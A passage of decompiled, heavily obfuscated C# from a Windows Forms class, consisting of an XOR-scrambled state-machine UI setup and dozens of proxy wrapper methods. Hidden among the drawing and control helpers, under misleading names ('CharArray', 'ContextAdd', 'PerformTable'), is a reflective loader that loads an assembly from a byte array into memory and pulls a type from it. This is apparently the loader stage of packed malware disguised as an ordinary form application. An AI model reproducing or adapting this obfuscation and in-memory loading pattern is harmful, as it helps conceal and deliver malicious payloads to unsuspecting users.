					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1922028448) ^ 0x3C5BBC59;
					continue;
				case 24u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)(num2 * 932828392) ^ -902881583;
					continue;
				case 23u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 1888550441) ^ 0x2E0C923A);
					continue;
				case 22u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)((num2 * 949273379) ^ 0x5588AA9E);
					continue;
				case 21u:
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = ((int)num2 * -1938508910) ^ 0x428BAB13;
					continue;
				case 20u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 1579778929) ^ 0x6D0532D1);
					continue;
				case 19u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 1883574991) ^ -639303408;
					continue;
				case 18u:
					num = (int)(num2 * 942797239) ^ -2118058862;
					continue;
				case 17u:
					num = ((int)num2 * -918092471) ^ 0x5D9E4806;
					continue;
				case 16u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -439745994) ^ 0x7C87CBBB;
					continue;
				case 15u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)((num2 * 1308592879) ^ 0x40043992);
					continue;
				case 14u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 432779970) ^ 0x2206442A);
					continue;
				case 13u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1624451735) ^ -670987221;
					continue;
				case 12u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -820959942) ^ -1874807995;
					continue;
				case 11u:
					num = ((int)num2 * -946227765) ^ 0x5243EE4B;
					continue;
				case 10u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 1468574095) ^ -1842733495;
					continue;
				case 9u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -1135328952) ^ 0x187C5EF8;
					continue;
				case 8u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)((num2 * 1816450949) ^ 0x4FED8C69);
					continue;
				case 7u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -202299467) ^ -1340468711;
					continue;
				case 6u:
					num = (int)(num2 * 1528605246) ^ -841555966;
					continue;
				case 5u:
					num = (int)(num2 * 1093171680) ^ -46277048;
					continue;
				case 4u:
					num = (int)((num2 * 843340960) ^ 0x68E86C09);
					continue;
				case 3u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 248817768) ^ 0x12AED5B);
					continue;
				case 2u:
					num = ((int)num2 * -1501045560) ^ 0x44F80369;
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1281491232) ^ -1578939131;
					continue;
				case 0u:
					num = (int)((num2 * 312640716) ^ 0x67C39F6C);
					continue;
				default:
					return;
				case 34u:
					break;
				case 63u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 297809519;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1A0AB442u) % 4u)
				{
				case 2u:
					num = (int)((num2 * 819143241) ^ 0x563E87B4);
					continue;
				case 1u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -1852461592) ^ -1479403948;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
